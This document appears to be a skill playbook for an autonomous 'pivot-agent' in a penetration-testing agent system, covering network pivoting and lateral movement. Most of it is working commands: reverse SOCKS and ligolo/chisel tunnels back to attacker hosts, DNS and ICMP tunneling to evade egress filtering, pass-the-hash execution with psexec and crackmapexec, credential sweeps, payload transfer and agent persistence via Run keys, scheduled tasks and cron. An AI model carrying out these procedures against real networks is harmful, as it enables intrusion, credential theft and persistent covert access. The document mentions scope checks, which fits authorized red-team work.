---
skill: lateral-movement-pivoting-deep-aggressive
mitre_attack_id: [T1021, T1572, T1133]
owasp_mapping: []
difficulty: advanced
mode: deep-aggressive
tags: [tunneling, proxy-chains, port-forwarding, network-pivot, lateral-movement, dns-tunneling, double-pivot, msf-routing]
---

# Deep Aggressive Mode Playbook: pivot-agent

> Purpose: This playbook is the deep-aggressive operational doctrine for network pivoting and lateral movement. Every pivot is verified before extension. Multi-hop chains, double pivots, protocol tunneling, and Metasploit routing are established so all downstream agents can reach the full attack surface.

## Phase 1 — Network Position Assessment

Reference: skills/network-security/service-enumeration.md

1. Receive session handle from exploit-agent (meterpreter, SSH, WinRM session).
2. Enumerate the compromised host's position:
   - Linux: `ip addr`, `ip route`, `cat /etc/resolv.conf`, `arp -a`, `ss -tlnp`
   - Windows: `ipconfig /all`, `route print`, `arp -a`, `netstat -ano`, `nslookup %USERDNSDOMAIN%`
3. Identify reachable subnets and DNS suffix to infer internal domains.
4. Map the internal attack surface with pivot-aware scanning:
   - `proxychains nmap -sT -Pn -p 445,3389,5985,22,1433,389 172.16.0.0/24`
   - `crackmapexec smb <target> -u <user> -p <pass>` for SMB reachability from the pivot.
5. Validate target subnets are in scope with scope-agent before routing.

## Phase 2 — Tunnel Selection & Deployment

1. **Full subnet access (preferred)**:
   - ligolo-ng: run relay on operator host, agent on target, add routes:
     - `./proxy -selfcert -laddr 0.0.0.0:11601`
     - `./agent -connect <attacker_ip>:11601 -ignore-cert`
     - `sudo ip route add 172.16.0.0/24 dev <ligolo_tun>`
   - sshuttle (no agent, SSH only): `sshuttle -r user@target 172.16.0.0/24 --dns -v`
2. **SOCKS proxy for tool routing**:
   - chisel reverse SOCKS:
     - `chisel server --reverse --port 8080`
     - `chisel client <attacker_ip>:8080 R:socks`
     - `proxychains4 -f proxychains.conf curl http://internal-target/`
   - ssh -D: `ssh -D 1080 -N user@target`
3. **Single-port forwarding**:
   - ssh -L: `ssh -L 8080:internal-web:80 user@target`
   - ssh -R: `ssh -R 9000:localhost:9000 user@target`
   - netsh (Windows): `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=<internal>`
   - fport (no admin): `fport 0.0.0.0 8080 <internal> 3389`
4. **frp reverse proxy** (cross-platform, NAT-friendly):
   - Server: `frps -c frps.toml` (bindPort 7000)
   - Client: `frpc -c frpc.toml` with `[socks5]` type socks5 remotePort 1080
5. Verify each tunnel before extension:
   - `proxychains ping -c 1 172.16.0.10`
   - `proxychains nc -zv 172.16.0.10 445`
   - `curl -x socks5://127.0.0.1:1080 http://internal-target/`

## Phase 3 — Proxychains & Tool Routing Configuration

1. Build `proxychains.conf`:
   ```
   strict_chain
   proxy_dns
   [ProxyList]
   socks5 127.0.0.1 1080
   ```
2. Test with simple tooling first:
   - `proxychains4 curl -sI http://internal-target/`
   - `proxychains4 nc -zv 172.16.0.20 3389`
3. Route heavy tools through the chain:
   - `proxychains4 nmap -sT -Pn -p- 172.16.0.20`
   - `proxychains4 sqlmap -u http://172.16.0.20/search?q=1`
4. Use dynamic_chain when proxies may be flaky; random_chain for evasion (rare).
5. For multi-hop, list hops in order: last proxy in list is closest to target.

## Phase 4 — Metasploit Routing

1. Add route through a meterpreter session:
   - `route add 172.16.0.0/24 <session_id>`
   - `route print` to verify
2. Automate: `use post/multi/manage/autoroute; set SESSION <id>; run`
3. Route module traffic through SOCKS when needed:
   - `setg Proxies socks5:127.0.0.1:1080`
   - `setg ReverseAllowProxy true`
4. Use `auxiliary/scanner/portscan/tcp` through the route to map the internal segment.
5. Hand the route table to downstream agents so scanner/exploit tools reach the new segment.

## Phase 5 — Lateral Movement to New Pivot Hosts

Reference: skills/network-security/protocol-exploitation.md (SMB relay and exec methods)

1. **WMI**:
   - `python3 /usr/share/doc/python3-impacket/examples/wmiexec.py <domain>/<user>:<pass>@<target>`
   - `wmic /node:<target> /user:<user> /password:<pass> process call create "cmd /c whoami"`
2. **PsExec / SMB exec**:
   - `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :<NTHASH> <domain>/<user>@<target>`
   - `crackmapexec smb <target> -u <user> -H <hash> -x 'whoami' --exec-method smbexec`
3. **WinRM**:
   - `evil-winrm -i <target> -u <user> -p <pass>`
   - `crackmapexec winrm <target> -u <user> -p <pass>`
4. **SCP** (file transfer across hops):
   - `scp -o ProxyJump=user@jump payload.exe user@target:/tmp/payload.exe`
   - `scp -o "ProxyCommand=nc -X 5 -x 127.0.0.1:1080 %h %p" payload user@target:/tmp/`
5. **RDP**:
   - `xfreerdp /v:<target> /u:<user> /p:<pass> /cert:ignore /dynamic-resolution`
   - Through SOCKS: `proxychains4 xfreerdp /v:<target> /u:<user> /p:<pass>`
6. **Credential sweep before pivoting**:
   - `crackmapexec smb <internal_subnet>/24 -u <user> -p <pass> --local-auth --continue-on-success`
   - Reuse validated hashes to move laterally: `crackmapexec smb <target> -u <user> -H <hash> --sam`

## Phase 6 — Double & Multi-Hop Pivots

1. Land a second pivot host in segment B (via WMI/WinRM/PsExec).
2. Deploy chisel/ligolo on host B and connect back:
   - `chisel client <attacker>:8080 R:socks2` (chisel server must run `--reverse`)
   - `./agent -connect <attacker>:11601 -ignore-cert`
3. Add routes for segment B:
   - `sudo ip route add 10.1.0.0/16 dev <ligolo_tun>`
   - `proxychains` chain: `socks5 127.0.0.1 1080` (A) then `socks5 127.0.0.1 1081` (B)
4. Verify reachability into segment B before any exploitation:
   - `proxychains4 nmap -sT -Pn 10.1.0.0/24`
5. For 3+ hops, prefer ligolo-ng/sshuttle to avoid latency collapse; each additional chisel hop multiplies overhead.
6. Log each hop: host, method, subnet added, verification result.

## Phase 7 — Protocol Tunneling (Restricted Egress)

1. **DNS tunneling**:
   - dnscat2 server: `ruby dnscat2.rb --dns "server=0.0.0.0,port=53"`
   - dnscat2 client: `./dnscat <attacker>`
   - iodine: `iodine -f 10.0.0.1 dns.attacker.com` then `ssh -D 1080 root@10.0.0.1`
2. **HTTP/HTTPS tunneling**:
   - chisel reverse over WebSocket: `chisel client --socks5 https://attacker:8080 R:socks`
   - frp http proxy: `[http_proxy] type = http; remote_port = 8080`
3. **ICMP tunneling**:
   - ptunnel-ng server/client for ICMP echo when TCP/UDP egress is blocked.
4. **TCP-over-DNS**: iodine or dnscat2 when only DNS is allowed.
5. Always test egress first: `curl -sI https://attacker` then fallback to DNS/ICMP checks.

## Phase 8 — Tunnel Health & Persistence

1. Keepalive: chisel `--keepalive 25s`; ssh `-o ServerAliveInterval=30 -o ServerAliveCountMax=3`; ligolo agent keepalive.
2. Auto-reconnect wrappers: systemd unit / scheduled task / `while true; do ...; sleep 5; done` on the pivot host.
3. Monitor latency and throughput: `proxychains4 time curl -s http://internal-target/`; document drift.
4. Persistence of agent binaries: Windows scheduled task / registry Run key; Linux systemd service or cron.
5. On drop, reconnect with exponential backoff (5s -> 10s -> 20s -> max 120s) and verify route tables still valid.

## Phase 9 — Teardown

1. Remove routes: `route del <subnet> via <gateway>`, `ip route del <subnet> dev <tun>`.
2. Kill tunnels: terminate chisel/ligolo/sshuttle processes on operator and pivot hosts.
3. Remove port proxies: `netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0`.
4. Delete persisted agents/scheduled tasks on the pivot hosts when cleanup is authorized.
5. Verify no orphan listeners: `ss -tlnp`, `netstat -ano | findstr LISTENING`.
6. Log teardown completion and residual risk to audit-agent.

## Verification

1. Every tunnel verified by ICMP and TCP probe to a known-live target in the routed subnet.
2. Every lateral move confirmed by command output from the new host (whoami/ipconfig).
3. Every hop in a multi-hop chain validated independently before the next hop is built.
4. Proxychains config tested with curl/nc before heavy tooling.
5. Egress-filtering workaround confirmed by actual tunnel establishment (DNS/HTTP/ICMP).
6. Routes published to downstream agents match verified reachability only.

## Skill Library References
- skills/network-security/service-enumeration.md
- skills/network-security/protocol-exploitation.md
- skills/threat-intel/skill-playbook.md
